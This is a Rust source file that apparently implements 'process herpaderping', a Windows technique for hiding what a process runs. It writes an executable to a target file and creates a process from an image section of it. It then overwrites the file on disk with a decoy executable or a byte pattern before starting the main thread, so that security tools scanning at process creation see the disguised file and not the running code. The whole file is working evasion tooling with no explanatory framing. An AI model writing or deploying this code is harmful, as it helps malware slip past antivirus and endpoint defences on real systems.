mod utils;

use ntapi::{
    ntpebteb::PEB,
    ntpsapi::{
        NtCreateThreadEx, NtCurrentPeb, NtCurrentProcess, PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
    },
    winapi::{
        shared::ntdef::NT_SUCCESS,
        um::winnt::{PAGE_READONLY, PVOID},
    },
};
use std::{ffi::c_void, ptr::null_mut};
use utils::{write_file_flushed, NtCreateProcessEx, NtCreateSection};
use windows_sys::Win32::{
    Foundation::{
        CloseHandle, GetLastError, FALSE, FARPROC, GENERIC_READ, GENERIC_WRITE, HANDLE,
        INVALID_HANDLE_VALUE,
    },
    Storage::FileSystem::{
        CreateFileW, ReadFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_BEGIN, FILE_SHARE_DELETE,
        FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
    },
    System::{
        Diagnostics::Debug::ReadProcessMemory,
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
        Memory::{SECTION_ALL_ACCESS, SEC_IMAGE},
        Threading::{
            TerminateProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
        },
    },
};

const PATTERN: [u8; 2] = [0x41, 0x48]; // "AH"

pub unsafe fn herpaderping(
    source_filename: &str,
    target_filename: &str,
    replace_with_filename: &Option<String>,
) {
    log::info!("Source File: {}", source_filename);
    log::info!("Target File: {}", target_filename);

    let source_handle = match get_source_file_handle(source_filename) {
        Ok(handle) => handle,
        Err(err) => panic!("CreateFileW for source error: {}", err),
    };

    // Creating a empty target exe to write src here further
    let target_handle = match create_target_and_get_handle(target_filename) {
        Ok(handle) => handle,
        Err(err) => {
            CloseHandle(source_handle);
            panic!("CreateFileW for target error: {}", err);
        }
    };

    log::info!("Target file created, handles to source file and target file retrieved");

    // Write source file to target file
    if let Err(err) = write_source_to_target(source_handle, target_handle) {
        CloseHandle(source_handle);
        CloseHandle(target_handle);
        panic!("Reading / writing source to target error: {}", err);
    }

    log::info!("Source file written to target file");

    // No needed anymore
    CloseHandle(source_handle);

    let target_process_handle = match create_target_process(target_handle) {
        Ok(handle) => handle,
        Err(err) => {
            CloseHandle(target_handle);
            panic!("Create process for target failed: {}", err);
        }
    };

    log::info!("Target process created");

    let image_entry_point_rva = match utils::get_image_entry_point_rva(target_handle) {
        Ok(rva) => rva,
        Err(err) => {
            CloseHandle(target_process_handle);
            TerminateProcess(target_process_handle, 0);
            CloseHandle(target_handle);
            panic!("Image entry point RVA error: {}", err);
        }
    };

    match replace_with_filename {
        Some(replace_filename) => {
            if let Err(err) = overwrite_target_with_replace_file(target_handle, &replace_filename) {
                CloseHandle(target_process_handle);
                TerminateProcess(target_process_handle, 0);
                CloseHandle(target_handle);
                panic!("Writing replace exe to target error: {}", err);
            }
            log::info!("Target file was replaced by file: {}", replace_filename);
        }
        None => {
            if let Err(err) = overwrite_target_with_pattern(target_handle, PATTERN.as_slice()) {
                CloseHandle(target_process_handle);
                TerminateProcess(target_process_handle, 0);
                CloseHandle(target_handle);
                panic!("Writing pattern to target error: {}", err);
            }
            log::info!("Target file was replaced by pattern");
        }
    }

    let thread_handle = match create_and_run_thread_in_target(
        target_filename,
        target_process_handle,
        image_entry_point_rva,
    ) {
        Ok(handle) => handle,
        Err(err) => {
            CloseHandle(target_process_handle);
            TerminateProcess(target_process_handle, 0);
            CloseHandle(target_handle);
            panic!(
                "Creating and starting main thread in target process error: {}",
                err
            );
        }
    };

    log::info!("Main thread in target process started. Waiting until the process is finished");
    WaitForSingleObject(target_process_handle, INFINITE);
    log::info!("Process herpaderping is over :D");

    CloseHandle(thread_handle);
    CloseHandle(target_process_handle);
    CloseHandle(target_handle);
}

unsafe fn get_source_file_handle(source_filename: &str) -> Result<HANDLE, u32> {
    let wide_source = utils::str_to_widestring(source_filename);
    let source_handle = CreateFileW(
        wide_source.as_ptr(),
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        0,
    );

    if source_handle == INVALID_HANDLE_VALUE {
        return Err(GetLastError());
    }

    #[cfg(feature = "debug")]
    log::debug!("Source file handle: {}", source_handle);

    return Ok(source_handle);
}

unsafe fn create_target_and_get_handle(target_filename: &str) -> Result<HANDLE, u32> {
    let wide_target = utils::str_to_widestring(target_filename);
    let target_handle = CreateFileW(
        wide_target.as_ptr(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        null_mut(),
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        0,
    );

    if target_handle == INVALID_HANDLE_VALUE {
        return Err(GetLastError());
    }

    #[cfg(feature = "debug")]
    log::debug!("Target file handle: {}", target_handle);

    return Ok(target_handle);
}

/// Writes source file to target file.
///
/// If successful - written bytes returns, else GetLastError() result.
unsafe fn write_source_to_target(source_handle: HANDLE, target_handle: HANDLE) -> Result<u32, u32> {
    let source_file_size = utils::get_file_size(source_handle)?;

    #[cfg(feature = "debug")]
    {
        let target_file_size = utils::get_file_size(target_handle)?;
        log::debug!("Source file size: {}", source_file_size);
        log::debug!("Target file size before writing: {}", target_file_size);
    }

    utils::set_file_pointer(source_handle, 0, FILE_BEGIN)?;

    let mut source_content_buffer: Vec<u8> = vec![0; source_file_size as usize];
    let ptr_source_content_buffer = source_content_buffer.as_mut_ptr() as *mut c_void;

    if ReadFile(
        source_handle,
        ptr_source_content_buffer,
        source_file_size as u32,
        null_mut(),
        null_mut(),
    ) == 0
    {
        let err = GetLastError();
        return Err(err);
    }

    #[cfg(feature = "debug")]
    log::debug!(
        "Content buffer size after reading source file: {}",
        source_content_buffer.len()
    );

    let bytes_written = write_file_flushed(
        target_handle,
        &source_content_buffer,
        source_file_size as u32,
    )?;

    return Ok(bytes_written);
}

unsafe fn create_target_process(target_handle: HANDLE) -> Result<HANDLE, u32> {
    let ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr());
    let nt_create_section_func = std::mem::transmute::<FARPROC, NtCreateSection>(GetProcAddress(
        ntdll,
        "NtCreateSection\0".as_ptr(),
    ));

    let nt_create_process_ex_func = std::mem::transmute::<FARPROC, NtCreateProcessEx>(
        GetProcAddress(ntdll, "NtCreateProcessEx\0".as_ptr()),
    );

    let mut section_handle: HANDLE = 0;
    let ntstatus = nt_create_section_func(
        &mut section_handle as *mut HANDLE,
        SECTION_ALL_ACCESS,
        null_mut(),
        null_mut(),
        PAGE_READONLY,
        SEC_IMAGE,
        target_handle,
    );
    if !NT_SUCCESS(ntstatus) {
        return Err(ntstatus as u32);
    }

    #[cfg(feature = "debug")]
    log::debug!("Section handler: {}", section_handle);

    let mut process_handle: HANDLE = 0;
    let ntstatus = nt_create_process_ex_func(
        &mut process_handle as *mut HANDLE,
        PROCESS_ALL_ACCESS,
        null_mut(),
        NtCurrentProcess as isize,
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        section_handle,
        null_mut(),
        null_mut(),
        FALSE,
    );
    if !NT_SUCCESS(ntstatus) {
        CloseHandle(section_handle);
        return Err(ntstatus as u32);
    }

    #[cfg(feature = "debug")]
    log::debug!("Process handler: {}", process_handle);

    CloseHandle(section_handle);
    return Ok(process_handle);
}

unsafe fn overwrite_target_with_replace_file(
    target_handle: HANDLE,
    replace_filename: &str,
) -> Result<(), u32> {
    let replace_filename_handle = get_source_file_handle(replace_filename)?;

    if replace_filename_handle == INVALID_HANDLE_VALUE || replace_filename_handle == 0 {
        return Err(GetLastError());
    }

    #[cfg(feature = "debug")]
    log::debug!("Replace filename handle: {}", replace_filename_handle);

    write_source_to_target(replace_filename_handle, target_handle)?;

    CloseHandle(replace_filename_handle);

    Ok(())
}

unsafe fn overwrite_target_with_pattern(target_handle: HANDLE, pattern: &[u8]) -> Result<(), u32> {
    let target_file_size = utils::get_file_size(target_handle)?;
    let buffer_with_pattern = utils::fill_buffer_with_pattern(pattern, target_file_size as usize);

    let mut _bytes_written = 0;

    write_file_flushed(
        target_handle,
        &buffer_with_pattern,
        buffer_with_pattern.len() as u32,
    )?;

    Ok(())
}

unsafe fn create_and_run_thread_in_target(
    target_filename: &str,
    target_process_handle: HANDLE,
    image_entry_point_rva: u32,
) -> Result<HANDLE, i32> {
    let pbi = utils::get_process_basic_info(target_process_handle)?;
    let mut peb = std::mem::zeroed::<PEB>();

    #[cfg(feature = "debug")]
    log::debug!("PEB base address: {:p}", pbi.PebBaseAddress);

    if ReadProcessMemory(
        target_process_handle,
        pbi.PebBaseAddress as *mut c_void,
        &mut peb as *mut PEB as *mut c_void,
        std::mem::size_of::<PEB>(),
        null_mut(),
    ) == 0
    {
        return Err(GetLastError() as i32);
    }

    let command_line = format!("\"{}\"", target_filename);
    let desktop_info = "WinSta0\\Default";

    utils::write_remote_process_parameters(
        target_process_handle,
        target_filename,
        None,
        None,
        Some(&command_line[..]),
        (*(*NtCurrentPeb()).ProcessParameters).Environment,
        Some(target_filename),
        Some(desktop_info),
        None,
        None,
    )?;

    //
    // Create the initial thread, when this first thread is inserted the
    // process create callback will fire in the kernel.
    //
    let remote_entry_point =
        (peb.ImageBaseAddress as usize + image_entry_point_rva as usize) as PVOID;

    #[cfg(feature = "debug")]
    log::debug!("Remote entry point address: {:p}", remote_entry_point);

    let mut thread_handle = null_mut();
    let ntstatus = NtCreateThreadEx(
        &mut thread_handle,
        THREAD_ALL_ACCESS,
        null_mut(),
        target_process_handle as *mut ntapi::winapi::ctypes::c_void,
        remote_entry_point,
        null_mut(),
        0,
        0,
        0,
        0,
        null_mut(),
    );

    if !NT_SUCCESS(ntstatus) {
        return Err(ntstatus);
    }

    #[cfg(feature = "debug")]
    log::debug!("Started thread handle: {}", thread_handle as HANDLE);

    Ok(thread_handle as HANDLE)
}
